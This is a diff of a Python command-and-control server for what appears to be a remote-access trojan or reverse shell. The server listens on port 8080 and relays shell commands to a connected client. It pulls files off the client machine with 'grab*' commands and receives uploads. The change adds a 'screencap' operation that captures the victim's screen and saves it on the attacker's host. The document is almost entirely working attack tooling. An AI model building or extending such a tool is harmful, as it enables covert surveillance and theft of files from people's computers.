@@ -9,38 +9,32 @@ import socket
 ip = "0.0.0.0"
 port = 8080
 
-def doGrab(conn, command, operation):
+def transfer(conn, command, operation):
     conn.send(command.encode())
 
-    # For grab operation, open a file in write mode, inside GrabbedFiles folder
-    # File name should be of format: grabbed_sourceFilePathOfClientMachine
-    # File name example: grabbed_C:/Users/John/Desktop/audit.docx
     # grab*C:\Users\user\Desktop\file.txt
     if (operation == "grab"):
-        grab, sourcePathAsFileName = command.split("*")
-        path = "/GrabbedFiles/"
-        sourcePathAsFileName
-        fileName = "grabbed_" + sourcePathAsFileName.replace("/", "-")
+        grab, path = command.split("*")
+        f=open('/root/Desktop/'+path, 'wb')
 
-        # transfer the grabbed file to the server
-        f = open(path + fileName, 'wb')
-        while True:
-            bits = conn.recv(5000)
-            if bits.endswith('DONE'.encode()):  # Client.py appends 'DONE' to end of file.
-                f.write(bits[:-4])  # Write those last received bits without the word 'DONE'
-                f.close()
-                print('[+] Transfer completed')
-                break
-            if 'File not found'.encode() in bits:
-                f.close()  # Not in directions
-                print('[-] Unable to find out the file')
-                break
-            f.write(bits)
-        print("File name: " + fileName)
-        print("Written to: " + path)
+    if(operation == "screenCap"):
+        fileName = "screenCapture.jpg"
+        f=open('/root/Desktop/'+fileName, 'wb')
+
+    while True:
+        bits = conn.recv(5000)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
+            f.close()
+            print ('[+] Transfer completed')
+            break
+        if 'File not found'.encode() in bits:
+            f.close()  # not in directions
+            print ('[-] Unable to find out the file')
+            break
+        f.write(bits)
 
 def doSend(conn, sourcePath, destinationPath, fileName):
-
     # For 'send' operation, open the file in the read mode
     # Read the file into packets and send them through connection object
     # After finished sending the whole file, send string 'DONE' to indicate the completion
@@ -78,7 +72,7 @@ def connect():
         #command format: grab*<File Path>
         #example: grab*C:\Users\John\Desktop\photo.jpeg
         elif 'grab' in command:
-          doGrab(conn, command, "grab")
+            transfer(conn, command, "grab")
 
         #command format: send*<destination path>*<File Name>
         #example: send*C:\Users\John\Desktop\*photo.jpeg
@@ -88,6 +82,8 @@ def connect():
             source = input("Source path: ")
             conn.send(command.encode())
             doSend(conn, source, destination, fileName)
+        elif 'screencap' in command:
+            transfer(conn, command, "screenCap")
 
         else:
             conn.send(command.encode())
